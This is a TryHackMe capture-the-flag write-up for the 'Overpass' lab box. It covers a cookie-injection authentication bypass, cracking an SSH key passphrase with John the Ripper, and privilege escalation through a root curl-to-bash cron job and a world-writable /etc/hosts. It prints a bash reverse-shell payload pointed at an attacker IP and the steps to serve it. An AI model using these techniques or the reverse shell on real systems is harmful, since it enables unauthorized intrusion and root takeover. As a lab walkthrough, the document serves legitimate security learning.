# Overpass - TryHackMe

> **Kill Chain Summary**:
> Port Scanning (Ports 22, 80) -> Web Directory Discovery (`/admin`) -> JavaScript Source Code Review (`login.js`) -> Client-Side Authentication Bypass via Injected `SessionToken` Cookie -> Extraction of Encrypted RSA Private Key -> Passphrase Cracking with `ssh2john` and John the Ripper (`james13`) -> SSH Shell as `james` -> Crontab Audit (`* * * * * root curl overpass.thm/... | bash`) -> Filesystem Audit (World-Writable `/etc/hosts`) -> Local DNS Spoofing to Attacker Machine -> Root Reverse Shell (`root`).

| Property | Value |
| :--- | :--- |
| **Target Name** | Overpass |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu) |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | Client-Side Authentication Bypass (Cookie Injection), SSH Key Cracking (John the Ripper), Writable `/etc/hosts` (DNS Spoofing), Cron Job Privilege Escalation |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was performed using Nmap:

```bash
nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.128.128.181 10.128.128.181
```

**Open Ports:**

| Port | Service | Version | Description |
| :--- | :--- | :--- | :--- |
| 22/tcp | SSH | OpenSSH 8.2p1 | Remote administrative access |
| 80/tcp | HTTP | Golang net/http | Web application interface |

### 1.2 Web Application Enumeration

Navigating to `http://10.128.128.181/` presents a website for a password manager product called Overpass:
- `/aboutus` mentions team members and potential system usernames (e.g., `james`).
- `/downloads` provides downloadable client builds.

Directory fuzzing with Gobuster revealed an administration endpoint:

```bash
gobuster dir -u http://10.128.128.181/ -w /usr/share/wordlists/dirb/common.txt
```

![Screenshot](../../attachments/Pasted image 20260608173804.png)
![Screenshot](../../attachments/Pasted image 20260608174009.png)

Accessing `http://10.128.128.181/admin` displays a login form.

---

## 2. Initial Access

### 2.1 Source Code Audit and Broken Authentication

Inspecting the client-side JavaScript file `login.js` associated with the login page revealed a critical flaw in authentication logic:

```javascript
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
```

> [!NOTE] Concept: Flawed Client-Side Authentication
> The backend authentication handler validates credentials and sets a cookie named `SessionToken`. However, the client script does not verify the signature or server-side validity of the token. The application merely checks for the existence of `SessionToken` within the browser's storage before allowing access to `/admin`.

#### Exploitation
1. Open browser Developer Tools (`F12`) and navigate to the **Storage** or **Application** tab.
2. Select **Cookies** for the target origin.
3. Add a new cookie:
   - **Name:** `SessionToken`
   - **Value:** `authenticated`
4. Refresh `http://10.128.128.181/admin`.

![Screenshot](../../attachments/Pasted image 20260608211333.png)
![Screenshot](../../attachments/Screenshot From 2026-06-08 21-16-44.png)

The authentication check is bypassed, granting access to the administration dashboard.

### 2.2 SSH Private Key Extraction and Cracking

The administration panel displays a note and an encrypted RSA private key belonging to user `james`.

Copy the private key to a local file named `id_rsa`:

```bash
cat << 'EOF' > id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F8E...
...
-----END RSA PRIVATE KEY-----
EOF
```

Because the key is encrypted with a passphrase, convert the key into a format crackable by John the Ripper using `ssh2john`:

```bash
python3 /usr/share/john/ssh2john.py id_rsa > key.hash
```

Crack the passphrase using the `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
```

```text
james13          (id_rsa)
```

The passphrase is recovered: **`james13`**.

### 2.3 SSH Authentication

Set proper file permissions on the private key and connect via SSH:

```bash
chmod 600 id_rsa
ssh james@10.128.128.181 -i id_rsa
```

Supply passphrase `james13` when prompted. A session is established as `james`.

Retrieve the user flag:

```bash
cat /home/james/user.txt
```

```text
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Local Enumeration: Crontab and File Permissions

Inspecting the system crontab in `/etc/crontab`:

```bash
cat /etc/crontab
```

```text
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Every minute, `root` retrieves a script from `overpass.thm/downloads/src/buildscript.sh` via `curl` and pipes it directly into `bash`.

Inspecting `/etc/hosts` and its file permissions:

```bash
ls -la /etc/hosts
```

```text
-rw-rw-rw- 1 root root 250 Jun 27 2020 /etc/hosts
```

```bash
cat /etc/hosts
```

```text
127.0.0.1 localhost
127.0.0.1 overpass.thm
```

> [!NOTE] Concept: Local DNS Spoofing via Writable `/etc/hosts`
> The `/etc/hosts` file is world-writable (`666`). Because the root cron job resolves `overpass.thm` to fetch and execute an arbitrary shell script without transport encryption or integrity checking, an unprivileged user can modify `/etc/hosts` to point `overpass.thm` to their own IP address and serve a malicious payload.

### 3.2 Exploitation: DNS Spoofing and File Hijack

#### Step 1: Stage the Payload on Kali
Recreate the exact URL path expected by the cron job on the attack machine:

```bash
mkdir -p downloads/src/
echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" > downloads/src/buildscript.sh
```

Host the payload on port 80:

```bash
python3 -m http.server 80
```

#### Step 2: Redirect `overpass.thm` on Target
Edit `/etc/hosts` on the target to point `overpass.thm` to the Kali IP:

```bash
sed -i 's/127.0.0.1 overpass.thm/10.10.14.5 overpass.thm/' /etc/hosts
```

Verify the entry:

```bash
grep overpass.thm /etc/hosts
10.10.14.5 overpass.thm
```

#### Step 3: Catch Elevated Shell
Start a Netcat listener:

```bash
nc -lvnp 4444
```

Within 60 seconds, root's cron job executes, requests `http://overpass.thm/downloads/src/buildscript.sh` from the attacker web server, and executes the reverse shell:

```text
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.128.128.181] 58492
# id
uid=0(root) gid=0(root) groups=0(root)
```

Retrieve the root flag:

```bash
cat /root/root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Extract SSH Key Hash for John the Ripper
python3 /usr/share/john/ssh2john.py id_rsa > key.hash

# Crack SSH Passphrase
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash

# Set Up Malicious Hosted Script Matching Cron Path
mkdir -p downloads/src/
echo "bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1" > downloads/src/buildscript.sh
python3 -m http.server 80

# Modify Local Host Resolution
echo "<KALI_IP> overpass.thm" >> /etc/hosts
```

---

## 5. Key Takeaways and Lessons Learned

1. **Client-Side Source Code Verification:** Web login mechanisms must always be inspected in developer tools before launching brute-force attacks. Developers sometimes place sensitive authorization logic directly into client-side scripts.
2. **Encrypted Key Cracking:** When an extracted SSH key demands a passphrase, immediately process it through `ssh2john` and run dictionary attacks against common wordlists like `rockyou.txt`.
3. **Insecure Automated File Retrieval:** Automated root processes that download and execute scripts over unauthenticated HTTP without hash verification are vulnerable to trivial compromise if name resolution (`/etc/hosts`, DNS) can be tampered with.

---

#tryhackme #linux #easy #javascript #broken-authentication #ssh-cracking #john #cron #etc-hosts #dns-spoofing #privesc